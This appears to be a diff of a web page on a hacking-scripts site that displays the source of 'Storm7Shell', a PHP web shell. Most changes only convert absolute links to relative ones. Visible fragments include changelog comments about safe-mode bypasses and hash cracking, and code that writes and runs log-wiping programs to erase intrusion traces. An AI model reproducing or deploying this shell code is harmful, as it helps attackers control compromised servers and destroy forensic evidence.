@@ -4,11 +4,11 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/stylesheet.css" media="screen" />
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/pygment_trac.css" media="screen" />
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/print.css" media="print" />
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/styles.css" media="print" />
-    <link rel="icon" type="image/x-icon" href="http://hackingscripts.com//favicon.ico">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
 
 
     <!--[if lt IE 9]>
@@ -21,7 +21,7 @@
   <body>
     <header>
       <div class="inner">
-        <h1> <a href="http://hackingscripts.com//">HackingScripts</a> </h1>
+        <h1> <a href="/">HackingScripts</a> </h1>
         <h2>Hack Scripts for everybody</h2>
       </div>
     </header>
@@ -46,7 +46,7 @@
 <span class="lineno">   5</span> <span class="sd">*</span>
 <span class="lineno">   6</span> <span class="sd">*  VERSION 2 B*TCH!!!!</span>
 <span class="lineno">   7</span> <span class="sd">*</span>
-<span class="lineno">   8</span> <span class="sd">*  By sToRm - the 15-year-old hacker &lt;img src=&quot;http://hackingscripts.com//wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt;</span>
+<span class="lineno">   8</span> <span class="sd">*  By sToRm - the 15-year-old hacker &lt;img src=&quot;/wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt;</span>
 <span class="lineno">   9</span> <span class="sd">*</span>
 <span class="lineno">  10</span> <span class="sd">*  Greetz to all my friends in #lobby</span>
 <span class="lineno">  11</span> <span class="sd">*</span>
@@ -81,7 +81,7 @@
 <span class="lineno">  40</span> <span class="sd">*  made the dir listing easier to read with the alternating bgcolors</span>
 <span class="lineno">  41</span> <span class="sd">*  little optimizations in code here and there (i&#39;m an optimization whore tbh)</span>
 <span class="lineno">  42</span> <span class="sd">*  submit md5/sha1 hash to cracking sites</span>
-<span class="lineno">  43</span> <span class="sd">*  made that awesome logo &lt;img src=&quot;http://hackingscripts.com//wp-includes/images/smilies/icon_wink.gif&quot; alt=&quot;;)&quot; class=&quot;wp-smiley&quot; /&gt;</span>
+<span class="lineno">  43</span> <span class="sd">*  made that awesome logo &lt;img src=&quot;/wp-includes/images/smilies/icon_wink.gif&quot; alt=&quot;;)&quot; class=&quot;wp-smiley&quot; /&gt;</span>
 <span class="lineno">  44</span> <span class="sd">*  added the disabled php functions thing (took from r57shell)</span>
 <span class="lineno">  45</span> <span class="sd">*  added better windows/*nix-specific aliases</span>
 <span class="lineno">  46</span> <span class="sd">*  cleaned up the safe-mode bypass functions (wow, some of the shittiest code i&#39;ve ever seen o_O )</span>
@@ -7037,7 +7037,7 @@
 <span class="lineno">6996</span> <span class="c1">// the wipe logs stuff needs to be before cmd, because it will change the $act if the write is successful</span>
 <span class="lineno">6997</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s1">&#39;miglc&#39;</span> <span class="o">||</span> <span class="nv">$act</span> <span class="o">==</span> <span class="s1">&#39;zap2&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// *nix cleaners</span>
 <span class="lineno">6998</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">))</span> <span class="p">{</span>
-<span class="lineno">6999</span>        <span class="nx">cf</span><span class="p">(</span><span class="nv">$act</span><span class="p">,</span> <span class="nv">$$act</span><span class="p">);</span> <span class="c1">// &#39;tis pure innovation of optimization &lt;img src=&quot;http://hackingscripts.com//wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt;</span>
+<span class="lineno">6999</span>        <span class="nx">cf</span><span class="p">(</span><span class="nv">$act</span><span class="p">,</span> <span class="nv">$$act</span><span class="p">);</span> <span class="c1">// &#39;tis pure innovation of optimization &lt;img src=&quot;/wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt;</span>
 <span class="lineno">7000</span>        <span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;./&#39;</span><span class="o">.</span><span class="nv">$act</span><span class="p">;</span> <span class="c1">// keep this before $act = &#39;cmd&#39;;</span>
 <span class="lineno">7001</span>        <span class="nv">$act</span> <span class="o">=</span> <span class="s1">&#39;cmd&#39;</span><span class="p">;</span>
 <span class="lineno">7002</span>        <span class="nv">$cmd_txt</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
@@ -8384,20 +8384,20 @@
 
 <h3>Storm7Shell script screenshot<figure id="attachment_406" style="width: 604px;" class="wp-caption aligncenter"></h3>
 
-<p><a href="http://hackingscripts.com//wp-content/uploads/2014/02/locus7shell_storm.png"><img src="http://hackingscripts.com//wp-content/uploads/2014/02/locus7shell_storm-1024x612.png" alt="Storm7Shell script screenshot" width="604" height="360" class="size-large wp-image-406" /></a><figcaption class="wp-caption-text">Storm7Shell script screenshot</figcaption></figure></p>
+<p><a href="/wp-content/uploads/2014/02/locus7shell_storm.png"><img src="/wp-content/uploads/2014/02/locus7shell_storm-1024x612.png" alt="Storm7Shell script screenshot" width="604" height="360" class="size-large wp-image-406" /></a><figcaption class="wp-caption-text">Storm7Shell script screenshot</figcaption></figure></p>
 
 
 
         </section>
 
         <aside id="sidebar">
-          <a href="http://hackingscripts.com//upload/" class="button">
+          <a href="http://upload.hackingscripts.com" class="button">
             <small>Upload</small>
             a file
           </a>
 
 
-          <a href="http://hackingscripts.com//scripts/" class="button">
+          <a href="/scripts/" class="button">
             <small>The entire list of</small>
             hack scripts
           </a>
